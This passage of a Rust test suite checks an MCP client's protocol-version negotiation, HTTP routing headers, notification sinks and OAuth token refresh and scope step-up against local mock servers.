                    "server/discover" => Ok(json!({
                        "supportedVersions": [super::MODERN_PROTOCOL_VERSION],
                        "capabilities": { "resources": {}, "prompts": {} }
                    })),
                    "tools/list" => Ok(json!({ "tools": [] })),
                    _ => Ok(json!({})),
                }
            }
            fn notify(&mut self, _method: &str, _params: Value) -> Result<(), TransportError> {
                Ok(())
            }
            fn set_subscription_listener(
                &mut self,
                filter: SubscriptionFilter,
            ) -> Result<(), TransportError> {
                self.filters.lock().unwrap().push(filter);
                Ok(())
            }
        }

        let requests = Arc::new(Mutex::new(Vec::new()));
        let filters = Arc::new(Mutex::new(Vec::new()));
        let mut server = DownstreamServer::connect(
            "modern".to_string(),
            Box::new(ModernProbe {
                requests: Arc::clone(&requests),
                filters: Arc::clone(&filters),
            }),
        )
        .unwrap();
        assert!(filters.lock().unwrap()[0].resource_subscriptions.is_empty());
        server.subscribe_resource("fixture://z").unwrap();
        server.subscribe_resource("fixture://a").unwrap();
        assert_eq!(
            filters.lock().unwrap().last().unwrap().resource_subscriptions,
            vec!["fixture://a".to_string(), "fixture://z".to_string()]
        );
        server.unsubscribe_resource("fixture://z").unwrap();
        assert_eq!(
            filters.lock().unwrap().last().unwrap().resource_subscriptions,
            vec!["fixture://a".to_string()]
        );
        assert!(
            requests
                .lock()
                .unwrap()
                .iter()
                .all(|method| method != "resources/subscribe" && method != "resources/unsubscribe"),
            "modern resource subscriptions travel only through subscriptions/listen"
        );
    }

    #[test]
    fn merge_protocol_meta_preserves_client_keys_and_survives_a_bogus_meta() {
        use super::{merge_protocol_meta, protocol_meta_for, MODERN_PROTOCOL_VERSION};
        const VERSION_KEY: &str = "io.modelcontextprotocol/protocolVersion";

        // A pre-existing `_meta` is merged into, not replaced.
        let mut params = json!({
            "_meta": {
                "traceparent": "keep",
                "io.modelcontextprotocol/clientCapabilities": {
                    "sampling": {},
                    "extensions": { "com.example/opaque": { "mode": "strict" } }
                }
            }
        });
        merge_protocol_meta(&mut params, &protocol_meta_for(MODERN_PROTOCOL_VERSION));
        assert_eq!(params["_meta"]["traceparent"], "keep", "client keys survive");
        assert_eq!(params["_meta"][VERSION_KEY], MODERN_PROTOCOL_VERSION);
        assert_eq!(
            params["_meta"]["io.modelcontextprotocol/clientCapabilities"]["extensions"]
                ["com.example/opaque"]["mode"],
            "strict"
        );
        assert!(params["_meta"]["io.modelcontextprotocol/clientCapabilities"]
            .get("sampling")
            .is_none());

        // A non-object `_meta` is rebuilt rather than panicking or being ignored.
        let mut params = json!({ "_meta": "nonsense" });
        merge_protocol_meta(&mut params, &protocol_meta_for(MODERN_PROTOCOL_VERSION));
        assert_eq!(params["_meta"][VERSION_KEY], MODERN_PROTOCOL_VERSION);
    }

    #[test]
    fn modern_requests_forward_only_client_extension_capabilities() {
        use super::{DownstreamServer, Transport, TransportError, MODERN_PROTOCOL_VERSION};
        use std::sync::{Arc, Mutex};

        struct ExtensionProbe {
            calls: Arc<Mutex<Vec<Value>>>,
        }

        impl Transport for ExtensionProbe {
            fn request(&mut self, method: &str, params: Value) -> Result<Value, TransportError> {
                match method {
                    "initialize" => Err(TransportError::Rpc(json!({
                        "code": -32601,
                        "message": "method not found"
                    }))),
                    "server/discover" => Ok(json!({
                        "supportedVersions": [MODERN_PROTOCOL_VERSION],
                        "capabilities": {
                            "extensions": {
                                "com.example/opaque": { "mode": "strict" }
                            }
                        }
                    })),
                    "tools/list" => Ok(json!({ "tools": [{ "name": "work" }] })),
                    "tools/call" => {
                        self.calls.lock().unwrap().push(params);
                        Ok(json!({ "content": [], "isError": false }))
                    }
                    other => Err(TransportError::Fatal(format!("unexpected method {other}"))),
                }
            }

            fn notify(&mut self, _method: &str, _params: Value) -> Result<(), TransportError> {
                Ok(())
            }
        }

        let calls = Arc::new(Mutex::new(Vec::new()));
        let mut server = DownstreamServer::connect(
            "modern".to_string(),
            Box::new(ExtensionProbe { calls: Arc::clone(&calls) }),
        )
        .unwrap();
        assert_eq!(server.extensions()["com.example/opaque"]["mode"], "strict");

        let meta = json!({
            "io.modelcontextprotocol/protocolVersion": MODERN_PROTOCOL_VERSION,
            "io.modelcontextprotocol/clientCapabilities": {
                "sampling": {},
                "extensions": {
                    "com.example/opaque": { "mimeTypes": ["text/html"] },
                    "io.modelcontextprotocol/tasks": {}
                }
            },
            "com.example/request": { "keep": true }
        });
        server
            .call_with_cancel("work", json!({}), None, Some(&meta))
            .unwrap();

        let calls = calls.lock().unwrap();
        let params = &calls[0];
        let capabilities = &params["_meta"]["io.modelcontextprotocol/clientCapabilities"];
        assert_eq!(
            capabilities["extensions"]["com.example/opaque"]["mimeTypes"][0],
            "text/html"
        );
        assert!(capabilities.get("sampling").is_none());
        assert_eq!(
            capabilities["extensions"]["io.modelcontextprotocol/tasks"],
            json!({})
        );
        assert_eq!(params["_meta"]["com.example/request"]["keep"], true);
    }

    #[test]
    fn modern_http_sends_routing_and_custom_headers_without_a_session() {
        use super::{HttpTransport, Transport, MODERN_PROTOCOL_VERSION};
        use std::collections::HashMap;
        use std::sync::{Arc, Mutex};

        let server = tiny_http::Server::http("127.0.0.1:0").unwrap();
        let port = server.server_addr().to_ip().unwrap().port();
        let captured = Arc::new(Mutex::new(HashMap::<String, String>::new()));
        let target = Arc::clone(&captured);
        let handle = std::thread::spawn(move || {
            let mut request = server.recv().unwrap();
            for header in request.headers() {
                target.lock().unwrap().insert(
                    header.field.as_str().to_ascii_lowercase().to_string(),
                    header.value.as_str().to_string(),
                );
            }
            let mut request_body = String::new();
            request.as_reader().read_to_string(&mut request_body).unwrap();
            let request_body: Value = serde_json::from_str(&request_body).unwrap();
            assert_eq!(request_body["params"]["name"], "downstream_tool");
            let content_type = tiny_http::Header::from_bytes(
                &b"Content-Type"[..],
                &b"application/json"[..],
            )
            .unwrap();
            let legacy_session = tiny_http::Header::from_bytes(
                &b"Mcp-Session-Id"[..],
                &b"must-be-ignored"[..],
            )
            .unwrap();
            request
                .respond(
                    tiny_http::Response::from_string(
                        r#"{"jsonrpc":"2.0","id":1,"result":{"ok":true}}"#,
                    )
                    .with_header(content_type)
                    .with_header(legacy_session),
                )
                .unwrap();
        });

        let mut transport = HttpTransport::new(&format!("http://127.0.0.1:{port}/"));
        transport.session_id = Some("legacy-session".to_string());
        transport.set_protocol_meta(Some(super::protocol_meta_for(MODERN_PROTOCOL_VERSION)));
        transport
            .request_with_cancel_and_headers(
                "tools/call",
                json!({ "name": "downstream_tool", "arguments": { "region": "west" } }),
                None,
                &[("Mcp-Param-Region".to_string(), "west".to_string())],
            )
            .unwrap();
        handle.join().unwrap();

        let headers = captured.lock().unwrap();
        assert_eq!(headers.get("mcp-method").map(String::as_str), Some("tools/call"));
        assert_eq!(headers.get("mcp-name").map(String::as_str), Some("downstream_tool"));
        assert_eq!(headers.get("mcp-param-region").map(String::as_str), Some("west"));
        assert!(!headers.contains_key("mcp-session-id"));
        assert!(transport.session_id.is_none(), "modern responses cannot restore a legacy session");
    }

    #[test]
    fn modern_http_task_requests_route_by_native_task_id() {
        for method in ["tasks/get", "tasks/update", "tasks/cancel"] {
            let headers = super::modern_standard_headers(&json!({
                "jsonrpc": "2.0",
                "id": 1,
                "method": method,
                "params": { "taskId": "native-task-id" }
            }))
            .unwrap()
            .into_iter()
            .collect::<HashMap<_, _>>();
            assert_eq!(headers.get("Mcp-Method").map(String::as_str), Some(method));
            assert_eq!(
                headers.get("Mcp-Name").map(String::as_str),
                Some("native-task-id")
            );
        }
    }

    #[test]
    fn modern_http_400_rpc_error_reaches_the_protocol_ladder() {
        use super::{HttpTransport, Transport, TransportError, MODERN_PROTOCOL_VERSION};

        let server = tiny_http::Server::http("127.0.0.1:0").unwrap();
        let port = server.server_addr().to_ip().unwrap().port();
        let handle = std::thread::spawn(move || {
            let request = server.recv().unwrap();
            let content_type = tiny_http::Header::from_bytes(
                &b"Content-Type"[..],
                &b"application/json"[..],
            )
            .unwrap();
            request
                .respond(
                    tiny_http::Response::from_string(
                        r#"{"jsonrpc":"2.0","id":1,"error":{"code":-32020,"message":"HeaderMismatch"}}"#,
                    )
                    .with_status_code(400)
                    .with_header(content_type),
                )
                .unwrap();
        });

        let mut transport = HttpTransport::new(&format!("http://127.0.0.1:{port}/"));
        transport.set_protocol_meta(Some(super::protocol_meta_for(MODERN_PROTOCOL_VERSION)));
        let error = transport.request("server/discover", json!({})).unwrap_err();
        handle.join().unwrap();
        assert!(matches!(error, TransportError::Rpc(_)));
        assert!(error.is_modern_protocol_error());
    }

    #[test]
    fn x_mcp_header_filters_only_the_malformed_tool_and_encodes_values() {
        use super::{filter_modern_http_tools, tool_request_headers};

        let valid = json!({
            "name": "query",
            "inputSchema": {
                "type": "object",
                "properties": {
                    "routing": {
                        "type": "object",
                        "properties": {
                            "region": { "type": "string", "x-mcp-header": "Region" },
                            "priority": { "type": "integer", "x-mcp-header": "Priority" },
                            "dryRun": { "type": "boolean", "x-mcp-header": "Dry-Run" }
                        }
                    }
                }
            }
        });
        let duplicate = json!({
            "name": "bad_duplicate",
            "inputSchema": {
                "type": "object",
                "properties": {
                    "a": { "type": "string", "x-mcp-header": "Region" },
                    "b": { "type": "string", "x-mcp-header": "REGION" }
                }
            }
        });
        let hidden = json!({
            "name": "bad_ref",
            "inputSchema": {
                "type": "object",
                "$defs": { "route": { "type": "string", "x-mcp-header": "Route" } }
            }
        });
        let tools = filter_modern_http_tools(
            "fixture",
            vec![valid.clone(), duplicate, hidden],
        );
        assert_eq!(tools, vec![valid]);

        let headers = tool_request_headers(
            &tools,
            "query",
            &json!({
                "routing": { "region": " 日本 ", "priority": 7, "dryRun": true }
            }),
        )
        .unwrap();
        assert_eq!(
            headers,
            vec![
                ("Mcp-Param-Dry-Run".to_string(), "true".to_string()),
                ("Mcp-Param-Priority".to_string(), "7".to_string()),
                ("Mcp-Param-Region".to_string(), "=?base64?IOaXpeacrCA=?=".to_string()),
            ]
        );
    }

    #[test]
    fn the_ladder_retries_discover_on_a_mutually_supported_version() {
        // The negotiate branch: a modern server that rejects our declared version
        // but names one we DO speak must be retried on that version and connect
        // successfully. Only the give-up branch had coverage, so the retry could
        // have been broken outright without a test noticing.
        use super::{DownstreamServer, Transport, TransportError, MODERN_PROTOCOL_VERSION};
        use std::collections::VecDeque;
        use std::sync::{Arc, Mutex};

        struct Ladder {
            responses: VecDeque<Result<Value, TransportError>>,
            /// Stamps AND requests, interleaved in call order.
            ///
            /// Counting stamps alone cannot express the claim. `connect` stamps
            /// three times on this path (before the probe, for the retry, and
            /// after `choose_protocol_version`), so a `len() >= 2` floor still
            /// held with the retry stamp deleted - and since the negotiate branch
            /// can only ever select `MODERN_PROTOCOL_VERSION`, asserting every
            /// stamp equals it was a tautology. What matters is ORDER: a stamp
            /// has to fall between the two `server/discover` sends (#511 review).
            events: Arc<Mutex<Vec<String>>>,
        }
        impl Transport for Ladder {
            fn request(&mut self, method: &str, _params: Value) -> Result<Value, TransportError> {
                self.events.lock().unwrap().push(format!("send:{method}"));
                self.responses.pop_front().expect("a response per request")
            }
            fn notify(&mut self, _m: &str, _p: Value) -> Result<(), TransportError> {
                Ok(())
            }
            fn set_protocol_meta(&mut self, meta: Option<Value>) {
                let version = meta
                    .as_ref()
                    .and_then(|m| m.get("io.modelcontextprotocol/protocolVersion"))
                    .and_then(Value::as_str)
                    .unwrap_or("<none>")
                    .to_string();
                self.events.lock().unwrap().push(format!("stamp:{version}"));
            }
        }

        let events = Arc::new(Mutex::new(Vec::new()));
        let transport = Ladder {
            events: Arc::clone(&events),
            responses: VecDeque::from(vec![
                // initialize: refused, as a modern server must.
                Err(TransportError::Rpc(json!({ "code": -32601, "message": "no initialize" }))),
                // First server/discover: "not that version, but I speak ours too".
                Err(TransportError::Rpc(json!({
                    "code": super::UNSUPPORTED_PROTOCOL_VERSION,
                    "message": "Unsupported protocol version",
                    "data": { "supported": ["2027-05-01", MODERN_PROTOCOL_VERSION] }
                }))),
                // Retry on the mutually supported version: accepted.
                Ok(json!({
                    "supportedVersions": [MODERN_PROTOCOL_VERSION],
                    "capabilities": { "tools": {} }
                })),
                // tools/list for the rest of the handshake.
                Ok(json!({ "tools": [] })),
            ]),
        };

        let server = DownstreamServer::connect("mock".to_string(), Box::new(transport))
            .expect("the ladder must recover on a mutually supported version");
        assert!(server.era().is_modern());
        assert_eq!(server.era().version(), MODERN_PROTOCOL_VERSION);

        // The retry must RE-stamp before sending, so the header and the body
        // `_meta` still agree on the newly chosen version. Skipping that would
        // send the rejected version again and draw the same error forever.
        //
        // Asserted positionally: find the two `server/discover` sends and require
        // a stamp strictly between them. A count-based assertion cannot see this,
        // because the stamps either side of the retry are made unconditionally.
        let events = events.lock().unwrap();
        let discovers: Vec<usize> = events
            .iter()
            .enumerate()
            .filter(|(_, e)| e.as_str() == "send:server/discover")
            .map(|(i, _)| i)
            .collect();
        assert_eq!(
            discovers.len(),
            2,
            "expected the probe and one negotiated retry, got {events:?}"
        );
        let expected = format!("stamp:{MODERN_PROTOCOL_VERSION}");
        assert!(
            events[discovers[0] + 1..discovers[1]].iter().any(|e| *e == expected),
            "the retry must re-stamp between the two sends, got {events:?}"
        );
    }

    #[test]
    fn modern_server_offering_another_version_is_not_reported_as_legacy() {
        // The compatibility ladder's pivot. A server that refuses `initialize`
        // AND answers the probe with a recognized modern error IS modern, it just
        // does not speak our version. Reporting the initialize refusal there sends
        // someone chasing a handshake bug on a reachable server (#511 review).
        use super::{DownstreamServer, Transport, TransportError};
        use std::collections::VecDeque;

        struct Probe {
            responses: VecDeque<Result<Value, TransportError>>,
        }
        impl Transport for Probe {
            fn request(&mut self, _method: &str, _params: Value) -> Result<Value, TransportError> {
                self.responses.pop_front().expect("a response per request")
            }
            fn notify(&mut self, _m: &str, _p: Value) -> Result<(), TransportError> {
                Ok(())
            }
        }

        let transport = Probe {
            responses: VecDeque::from(vec![
                // initialize: refused, as a modern server must.
                Err(TransportError::Rpc(json!({
                    "code": -32601, "message": "initialize is not part of 2026-07-28"
                }))),
                // server/discover: recognized modern error naming what it speaks.
                Err(TransportError::Rpc(json!({
                    "code": super::UNSUPPORTED_PROTOCOL_VERSION,
                    "message": "Unsupported protocol version",
                    "data": { "supported": ["2027-05-01"], "requested": "2026-07-28" }
                }))),
            ]),
        };

        let err = match DownstreamServer::connect("mock".to_string(), Box::new(transport)) {
            Err(err) => err,
            Ok(_) => panic!("no mutually supported version, so connect must fail"),
        };
        assert!(
            err.contains("2027-05-01") && err.contains(super::MODERN_PROTOCOL_VERSION),
            "the error must name what each side speaks, got: {err}"
        );
        assert!(
            !err.contains("initialize is not part of"),
            "a modern server must not be reported via the initialize refusal, got: {err}"
        );
    }

    #[test]
    fn http_protocol_header_follows_the_negotiated_version() {
        // From 2026-07-28 the MCP-Protocol-Version header MUST equal the
        // `_meta` version in the body. A hardcoded header would disagree with the
        // `_meta` that `set_protocol_meta` stamps, and a modern server would
        // answer 400 HeaderMismatch (-32020) to every request. Invisible to the
        // stdio tests, which have no headers at all (#511 review).
        use super::{HttpTransport, Transport, MODERN_PROTOCOL_VERSION, PROTOCOL_VERSION};

        let mut t = HttpTransport::new("https://example.invalid/mcp");
        assert_eq!(
            t.wire_protocol_version(),
            PROTOCOL_VERSION,
            "a legacy connection declares exactly what it always did"
        );

        t.set_protocol_meta(Some(super::protocol_meta_for(MODERN_PROTOCOL_VERSION)));
        assert_eq!(
            t.wire_protocol_version(),
            MODERN_PROTOCOL_VERSION,
            "the header must follow the negotiated version, not a constant"
        );
    }

    #[test]
    fn forward_line_invokes_progress_sink_when_armed() {
        // Mirrors the resource-updated sink test. Every other `forward_line` test
        // passes an empty progress sink, so without this nothing pins that
        // `notifications/progress` actually reaches a bound sink, and a
        // regression that silently stopped routing progress would stay green.
        use super::{forward_line, ProgressSink};
        use std::sync::atomic::{AtomicBool, AtomicU8, Ordering};
        use std::sync::{Arc, Mutex};

        let seen: Arc<Mutex<Vec<Value>>> = Arc::new(Mutex::new(Vec::new()));
        let sink_seen = Arc::clone(&seen);
        let sink: ProgressSink = Arc::new(move |note| {
            sink_seen.lock().unwrap().push(note);
        });
        let dirty = Some(Arc::new(AtomicU8::new(0)));
        let armed = Arc::new(AtomicBool::new(false));
        let (tx, rx) = std::sync::mpsc::channel();
        let no_sink = None;
        let progress = Arc::new(Mutex::new(Some(sink)));
        let line = r#"{"jsonrpc":"2.0","method":"notifications/progress","params":{"progressToken":"tp-1","progress":1,"total":2}}"#;

        // Unarmed (still in the handshake window): forwarded, but not routed.
        assert!(forward_line(line.to_string(), &tx, &dirty, &armed, &no_sink, &progress));
        assert!(seen.lock().unwrap().is_empty());
        assert_eq!(rx.recv().unwrap(), line);

        // Armed: the sink receives the whole notification, token included.
        armed.store(true, Ordering::SeqCst);
        assert!(forward_line(line.to_string(), &tx, &dirty, &armed, &no_sink, &progress));
        let got = seen.lock().unwrap().clone();
        assert_eq!(got.len(), 1);
        assert_eq!(got[0]["params"]["progressToken"], "tp-1");
        // Not a list change, so no dirty bit.
        assert_eq!(dirty.as_ref().unwrap().load(Ordering::SeqCst), 0);
        assert_eq!(rx.recv().unwrap(), line);

        // A progress notification with no token is unroutable and never reaches
        // the sink, so the gateway is not woken for something it must drop.
        let untokened = r#"{"jsonrpc":"2.0","method":"notifications/progress","params":{"progress":1}}"#;
        assert!(forward_line(untokened.to_string(), &tx, &dirty, &armed, &no_sink, &progress));
        assert_eq!(seen.lock().unwrap().len(), 1, "still just the one");
    }

    #[test]
    fn forward_line_invokes_resource_updated_sink_when_armed() {
        use super::{forward_line, ResourceUpdatedSink};
        use std::sync::atomic::{AtomicBool, AtomicU8, Ordering};
        use std::sync::{Arc, Mutex};

        let seen: Arc<Mutex<Vec<String>>> = Arc::new(Mutex::new(Vec::new()));
        let sink_seen = Arc::clone(&seen);
        let sink: ResourceUpdatedSink = Arc::new(move |uri| {
            sink_seen.lock().unwrap().push(uri);
        });
        let dirty = Some(Arc::new(AtomicU8::new(0)));
        let armed = Arc::new(AtomicBool::new(false));
        let (tx, rx) = std::sync::mpsc::channel();
        let sink_opt = Some(sink);
        let no_progress = Arc::new(Mutex::new(None));
        let line = r#"{"jsonrpc":"2.0","method":"notifications/resources/updated","params":{"uri":"fixture://r"}}"#;

        // Unarmed: no sink call.
        assert!(forward_line(line.to_string(), &tx, &dirty, &armed, &sink_opt, &no_progress));
        assert!(seen.lock().unwrap().is_empty());
        assert_eq!(rx.recv().unwrap(), line);

        // Armed: sink receives the URI; dirty bits stay clear (not a list change).
        armed.store(true, Ordering::SeqCst);
        assert!(forward_line(line.to_string(), &tx, &dirty, &armed, &sink_opt, &no_progress));
        assert_eq!(seen.lock().unwrap().as_slice(), &["fixture://r".to_string()]);
        assert_eq!(dirty.as_ref().unwrap().load(Ordering::SeqCst), 0);
        assert_eq!(rx.recv().unwrap(), line);
    }

    #[test]
    fn post_refreshes_proactively_before_sending() {
        use super::{HttpTransport, RefreshFn};
        use std::sync::atomic::{AtomicUsize, Ordering};
        use std::sync::{Arc, Mutex};
        use std::time::Duration;

        let server = tiny_http::Server::http("127.0.0.1:0").unwrap();
        let port = server.server_addr().to_ip().unwrap().port();
        let seen_auth = Arc::new(Mutex::new(String::new()));
        let captured = Arc::clone(&seen_auth);
        let handle = std::thread::spawn(move || {
            let req = server
                .recv_timeout(Duration::from_secs(3))
                .unwrap()
                .expect("proactively refreshed request should reach the server");
            *captured.lock().unwrap() = req
                .headers()
                .iter()
                .find(|h| h.field.equiv("Authorization"))
                .map(|h| h.value.as_str().to_string())
                .unwrap_or_default();
            let ct =
                tiny_http::Header::from_bytes(&b"Content-Type"[..], &b"application/json"[..])
                    .unwrap();
            let body = r#"{"jsonrpc":"2.0","id":1,"result":{"ok":true}}"#;
            let _ = req.respond(tiny_http::Response::from_string(body).with_header(ct));
        });

        let refresh_calls = Arc::new(AtomicUsize::new(0));
        let calls = Arc::clone(&refresh_calls);
        let refresh: Option<RefreshFn> = Some(Box::new(move |force| {
            assert!(!force, "successful proactive refresh should avoid a forced retry");
            calls.fetch_add(1, Ordering::SeqCst);
            Ok(Some("fresh".to_string()))
        }));
        let url = format!("http://127.0.0.1:{port}/");
        let mut transport =
            HttpTransport::with_auth_refresh(&url, Some("stale".to_string()), refresh);

        let result = transport
            .post(
                &serde_json::json!({ "jsonrpc": "2.0", "id": 1, "method": "ping" }),
                true,
            )
            .expect("post should use the proactively refreshed token");
        handle.join().unwrap();

        assert!(result.is_some());
        assert_eq!(refresh_calls.load(Ordering::SeqCst), 1);
        assert_eq!(*seen_auth.lock().unwrap(), "Bearer fresh");
    }

    #[test]
    fn post_uses_current_token_when_proactive_refresh_fails() {
        use super::{HttpTransport, RefreshFn};
        use std::sync::{Arc, Mutex};

        let server = tiny_http::Server::http("127.0.0.1:0").unwrap();
        let port = server.server_addr().to_ip().unwrap().port();
        let seen_auth = Arc::new(Mutex::new(String::new()));
        let captured = Arc::clone(&seen_auth);
        let handle = std::thread::spawn(move || {
            let req = server.recv().unwrap();
            *captured.lock().unwrap() = req
                .headers()
                .iter()
                .find(|h| h.field.equiv("Authorization"))
                .map(|h| h.value.as_str().to_string())
                .unwrap_or_default();
            let ct =
                tiny_http::Header::from_bytes(&b"Content-Type"[..], &b"application/json"[..])
                    .unwrap();
            let body = r#"{"jsonrpc":"2.0","id":1,"result":{"ok":true}}"#;
            let _ = req.respond(tiny_http::Response::from_string(body).with_header(ct));
        });

        let refresh: Option<RefreshFn> = Some(Box::new(|force| {
            assert!(!force);
            Err("temporary OAuth endpoint failure".to_string())
        }));
        let url = format!("http://127.0.0.1:{port}/");
        let mut transport =
            HttpTransport::with_auth_refresh(&url, Some("still-valid".to_string()), refresh);

        let result = transport.post(
            &serde_json::json!({ "jsonrpc": "2.0", "id": 1, "method": "ping" }),
            true,
        );
        handle.join().unwrap();

        assert!(result.is_ok());
        assert_eq!(*seen_auth.lock().unwrap(), "Bearer still-valid");
    }

    #[test]
    fn forced_refresh_without_callback_returns_auth_error() {
        use super::HttpTransport;

        let mut transport = HttpTransport::new("http://127.0.0.1:1/");
        let error = transport
            .force_refresh_after_auth_error(401)
            .expect_err("missing refresh callback should return an authentication error");

        assert_eq!(
            error.to_string(),
            "HTTP 401 (needs authentication): no refresh callback configured"
        );
    }

    #[test]
    fn insufficient_scope_reauthorizes_and_retries_without_refreshing() {
        use super::{HttpTransport, RefreshFn, ScopeReauthorizeFn};
        use std::sync::atomic::{AtomicUsize, Ordering};
        use std::sync::{Arc, Mutex};

        let server = tiny_http::Server::http("127.0.0.1:0").unwrap();
        let port = server.server_addr().to_ip().unwrap().port();
        let seen_auth = Arc::new(Mutex::new(Vec::new()));
        let captured = Arc::clone(&seen_auth);
        let handle = std::thread::spawn(move || {
            for hit in 0..2 {
                let request = server
                    .recv_timeout(std::time::Duration::from_secs(2))
                    .unwrap()
                    .expect("step-up request");
                captured.lock().unwrap().push(
                    request
                        .headers()
                        .iter()
                        .find(|header| header.field.equiv("Authorization"))
                        .map(|header| header.value.as_str().to_string())
                        .unwrap_or_default(),
                );
                if hit == 0 {
                    let challenge = tiny_http::Header::from_bytes(
                        b"WWW-Authenticate",
                        b"Bearer error=\"insufficient_scope\", scope=\"files:write\"",
                    )
                    .unwrap();
                    request
                        .respond(
                            tiny_http::Response::from_string("more access required")
                                .with_status_code(403)
                                .with_header(challenge),
                        )
                        .unwrap();
                } else {
                    let content_type =
                        tiny_http::Header::from_bytes(b"Content-Type", b"application/json")
                            .unwrap();
                    request
                        .respond(
                            tiny_http::Response::from_string(
                                r#"{"jsonrpc":"2.0","id":1,"result":{"ok":true}}"#,
                            )
                            .with_header(content_type),
                        )
                        .unwrap();
                }
            }
        });

        let forced_refreshes = Arc::new(AtomicUsize::new(0));
        let forced = Arc::clone(&forced_refreshes);
        let refresh: Option<RefreshFn> = Some(Box::new(move |force| {
            if force {
                forced.fetch_add(1, Ordering::SeqCst);
            }
            Ok(None)
        }));
        let challenged_scope = Arc::new(Mutex::new(String::new()));
        let captured_scope = Arc::clone(&challenged_scope);
        let reauthorize: Option<ScopeReauthorizeFn> = Some(Box::new(move |scope| {
            *captured_scope.lock().unwrap() = scope.to_string();
            Ok("step-up-token".to_string())
        }));
        let url = format!("http://127.0.0.1:{port}/");
        let mut transport =
            HttpTransport::with_auth_refresh(&url, Some("old-token".to_string()), refresh);
        transport.set_scope_reauthorize(reauthorize);

        let result = transport
            .post(
                &serde_json::json!({
                    "jsonrpc": "2.0", "id": 1, "method": "tools/call",
                    "params": { "name": "files_write", "arguments": {} }
                }),
                true,
            )
            .expect("step-up token should retry the original request");
        handle.join().unwrap();

        assert!(result.is_some());
        assert_eq!(*challenged_scope.lock().unwrap(), "files:write");
        assert_eq!(forced_refreshes.load(Ordering::SeqCst), 0);
        assert_eq!(
            seen_auth.lock().unwrap().as_slice(),
            &["Bearer old-token".to_string(), "Bearer step-up-token".to_string()]
        );
    }

    #[test]
    fn scope_attempts_use_a_canonical_set_key() {
        assert_eq!(
            super::canonical_scope_set(" files:write files:read files:write "),
            "files:read files:write"
        );
    }

    #[test]
    fn repeated_insufficient_scope_is_bounded_and_never_uses_refresh() {
        use super::{HttpTransport, RefreshFn, ScopeReauthorizeFn};
        use std::sync::atomic::{AtomicUsize, Ordering};
        use std::sync::Arc;

        let server = tiny_http::Server::http("127.0.0.1:0").unwrap();
        let port = server.server_addr().to_ip().unwrap().port();
        let handle = std::thread::spawn(move || {
            for hit in 0..2 {
                let request = server
                    .recv_timeout(std::time::Duration::from_secs(2))
                    .unwrap()
                    .expect("step-up request");
                let scope = if hit == 0 {
                    "files:write files:read"
                } else {
                    "files:read files:write files:write"
                };
                let challenge = tiny_http::Header::from_bytes(
                    b"WWW-Authenticate",
                    format!("Bearer error=\"insufficient_scope\", scope=\"{scope}\"")
                        .as_bytes(),
                )
                .unwrap();
                request
                    .respond(
                        tiny_http::Response::from_string("still insufficient")
                            .with_status_code(403)
                            .with_header(challenge),
                    )
                    .unwrap();
            }
        });
        let refresh_calls = Arc::new(AtomicUsize::new(0));
        let refresh_count = Arc::clone(&refresh_calls);
        let refresh: Option<RefreshFn> = Some(Box::new(move |force| {
            if force {
                refresh_count.fetch_add(1, Ordering::SeqCst);
            }
            Ok(None)
        }));
        let reauth_calls = Arc::new(AtomicUsize::new(0));
        let reauth_count = Arc::clone(&reauth_calls);
        let reauthorize: Option<ScopeReauthorizeFn> = Some(Box::new(move |_| {
            reauth_count.fetch_add(1, Ordering::SeqCst);
            Ok("step-up-token".to_string())
        }));
        let url = format!("http://127.0.0.1:{port}/");
        let mut transport =
            HttpTransport::with_auth_refresh(&url, Some("old-token".to_string()), refresh);
        transport.set_scope_reauthorize(reauthorize);

        let error = transport
            .post(
                &serde_json::json!({
                    "jsonrpc": "2.0", "id": 1, "method": "tools/call",
                    "params": { "name": "files_write", "arguments": {} }
                }),
                true,
            )
            .expect_err("the same rejected scope must not loop");
        handle.join().unwrap();

        assert!(error.to_string().contains("already requested"));
        assert_eq!(reauth_calls.load(Ordering::SeqCst), 1);
        assert_eq!(refresh_calls.load(Ordering::SeqCst), 0);
    }

    #[test]
    fn rejected_step_up_token_does_not_consume_a_refresh_exchange() {
        use super::{HttpTransport, RefreshFn, ScopeReauthorizeFn};
        use std::sync::atomic::{AtomicUsize, Ordering};
        use std::sync::Arc;

        let server = tiny_http::Server::http("127.0.0.1:0").unwrap();
        let port = server.server_addr().to_ip().unwrap().port();
        let handle = std::thread::spawn(move || {
            for hit in 0..2 {
                let request = server
                    .recv_timeout(std::time::Duration::from_secs(2))
                    .unwrap()
                    .expect("step-up request");
                let response = if hit == 0 {
                    tiny_http::Response::from_string("more access required")
                        .with_status_code(403)
                        .with_header(
                            tiny_http::Header::from_bytes(
                                b"WWW-Authenticate",
                                b"Bearer error=\"insufficient_scope\", scope=\"files:write\"",
                            )
                            .unwrap(),
                        )
                } else {
                    tiny_http::Response::from_string("new token rejected").with_status_code(401)
                };
                request.respond(response).unwrap();
            }
        });

        let refresh_calls = Arc::new(AtomicUsize::new(0));
        let refresh_count = Arc::clone(&refresh_calls);
        let refresh: Option<RefreshFn> = Some(Box::new(move |force| {
            if force {
                refresh_count.fetch_add(1, Ordering::SeqCst);
            }
            Ok(Some("refreshed-token".to_string()))
        }));
        let reauthorize: Option<ScopeReauthorizeFn> =
            Some(Box::new(move |_| Ok("step-up-token".to_string())));
        let url = format!("http://127.0.0.1:{port}/");
        let mut transport =
            HttpTransport::with_auth_refresh(&url, Some("old-token".to_string()), refresh);
        transport.set_scope_reauthorize(reauthorize);

        let error = transport
            .post(
                &serde_json::json!({
                    "jsonrpc": "2.0", "id": 1, "method": "tools/call",
                    "params": { "name": "files_write", "arguments": {} }
                }),
                true,
            )
            .expect_err("a rejected step-up token must surface without refreshing");
        handle.join().unwrap();

        assert!(error.to_string().contains("HTTP 401"));
        assert_eq!(refresh_calls.load(Ordering::SeqCst), 0);
    }

    #[test]
    fn inline_post_refreshes_token_and_retries_on_401() {
        use super::{HttpTransport, RefreshFn};
        use std::sync::atomic::{AtomicUsize, Ordering};
        use std::sync::{Arc, Mutex};

        let server = tiny_http::Server::http("127.0.0.1:0").unwrap();
        let port = server.server_addr().to_ip().unwrap().port();
        let retry_auth = Arc::new(Mutex::new(String::new()));
        let hits = Arc::new(AtomicUsize::new(0));
        let (captured, hit_count) = (Arc::clone(&retry_auth), Arc::clone(&hits));
        let handle = std::thread::spawn(move || {
            for _ in 0..2 {
                let req = server.recv().unwrap();
                if hit_count.fetch_add(1, Ordering::SeqCst) == 0 {
                    let _ = req.respond(
                        tiny_http::Response::from_string("unauthorized").with_status_code(401),
                    );
                } else {
                    *captured.lock().unwrap() = req
                        .headers()
                        .iter()
                        .find(|h| h.field.equiv("Authorization"))
